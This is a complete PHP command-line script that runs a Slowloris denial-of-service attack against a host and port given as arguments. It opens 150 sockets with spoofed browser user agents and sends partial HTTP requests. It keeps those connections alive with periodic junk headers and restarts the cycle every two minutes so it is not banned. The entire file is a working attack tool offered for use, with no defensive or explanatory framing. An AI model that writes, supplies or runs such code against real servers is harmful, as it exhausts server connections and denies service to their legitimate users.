#!/usr/bin/php
<?php


$host = @$argv[1]=='-h' ? @$argv[2]: die("Usage Example:: php slowLoris.php -h example.com -p 80\n");
$port = (@$argv[3]=='-p') ? @$argv[4] : "80" ;

$user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
];

$socket_list = array();



// Initalizing the attack from here
initalize_attack();



function initalize_attack(){
    global $host;
    global $socket_list;

    echo "Attacking ".$host." with 150 socket\n";
    echo "Creating Sockets...\n";
    create_sockets();

    $time=0;
    while($time<120){
        echo "Sending custom headers,to keep sockets alive...Socket Count ".count($socket_list)."\n";
        for($i=0;$i<count($socket_list);$i++){
            if(!@socket_write($socket_list[$i],"X-a:".rand(0,2000)."\r\n")){
                 array_splice($socket_list,$i);
            }
        }

        while(count($socket_list)<150){
            $socket = init_socket();
            $socket_list[] = $socket;
        }

        $time += 15;
        sleep(15);
    }
    // after 2 minutes... lets close the sockets and start again
    close_sockets_And_start_again();
}

function create_sockets(){
    global $socket_list;
    for($i=0;$i<150;$i++){
        $socket = init_socket();
        $socket_list[] = $socket;
    }
}


function init_socket(){
    global $host;
    global $port;
    global $user_agents;

    $socket = socket_create(AF_INET, SOCK_STREAM, 0) or die("Could not create socket\n");
    // set_time_limit(4);
    $result = @socket_connect($socket, $host, $port) or die("Could not connect to server\n");

    socket_write($socket, "GET /?" . rand(0,2000) . "HTTP/1.1\r\n");
    $random_array_index = array_rand($user_agents);
    socket_write($socket, "User-Agent:" . $user_agents[$random_array_index] ."\r\n");
    socket_write($socket,"{Accept-language: en-US,en,q=0.5}\r\n");

    return $socket;
}



function close_sockets_And_start_again(){
    global $socket_list;

    echo "Closing Sockets and starting again not to get band \n";
    for($i=0;$i<count($socket_list);$i++){
        socket_close($socket_list[$i]);
    }
    $socket_list = [];

    initalize_attack();
}


?>